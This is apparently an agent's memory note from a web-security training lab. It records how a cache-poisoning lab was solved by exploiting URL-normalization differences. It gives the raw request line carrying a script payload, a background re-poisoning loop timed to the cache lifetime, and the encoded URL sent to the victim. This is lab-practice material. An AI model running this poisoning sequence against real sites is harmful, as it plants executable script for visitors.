---
metadata:
  node_type: memory
name: "PRS lab web-cache-poisoning URL normalization arm A"
description: "Cache key normalization = percent-decode; 404 echoes raw path; poison raw request-line, deliver percent-encoded URL"
last_updated: 2026-10-10T15:57:39+08:00
created: 2026-10-10T15:57:39+08:00
---

Lab: /web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization (solved, congrats banner confirmed).

Mechanism (the whole lab in one line): the front-end cache builds its cache KEY by percent-DECODING the URL, while the back-end 404 handler echoes the request path verbatim (raw bytes, no HTML encoding).

Evidence for the normalization direction:
- GET /post%3FpostId=X -> X-Cache: hit, age 8, body identical to GET /post?postId=X ("Invalid blog post ID").
  So key(%3F-form) == key(decoded form): normalization decodes, it does not encode.
- Control: GET /zzmark9 -> 404 body "<p>Not Found: /zzmark9</p>", cache-control max-age=10, cached (404s are cacheable here).

XSS face (why it is "not directly exploitable"):
- 404 body is "<p>Not Found: <PATH></p>"; raw < / > in the path come back live, so <script>alert(1)</script> runs.
- A browser can never send raw < / > in a URL (it percent-encodes), so the direct request yields the encoded echo and no XSS.
- Front-end rejects a path with a space (GET /<img src=x ...> -> 400 "Protocol error"); space-free payloads only.

Solve sequence:
1. Poison with the RAW request line, repeatedly (raw_poison <base>/ --request-line 'GET /<script>alert(1)</script> HTTP/1.1' --interval-secs 3, background): max-age=10, so the loop re-poisons on each expiry and keeps the key live.
2. Deliver the percent-ENCODED url: POST /deliver-to-victim, form answer=https://<host>/%3Cscript%3Ealert(1)%3C/script%3E -> {"correct":true}.
   The victim's encoded request decodes onto the poisoned raw key -> the cached live script body executes -> banner flips.
3. banner_verdict: solved, "Congratulations, you solved the lab!".

Pitfalls: the 10s TTL is the whole timing problem (poison must be fresh at victim-visit time); the victim always issues the encoded form, which is exactly what the decode-normalizing key rewards.
Pieces used: page_read (widget id), range_launch (launch-url), raw_matrix (key-normalization proof), raw_poison (keep-alive), http_session (delivery), banner_verdict.

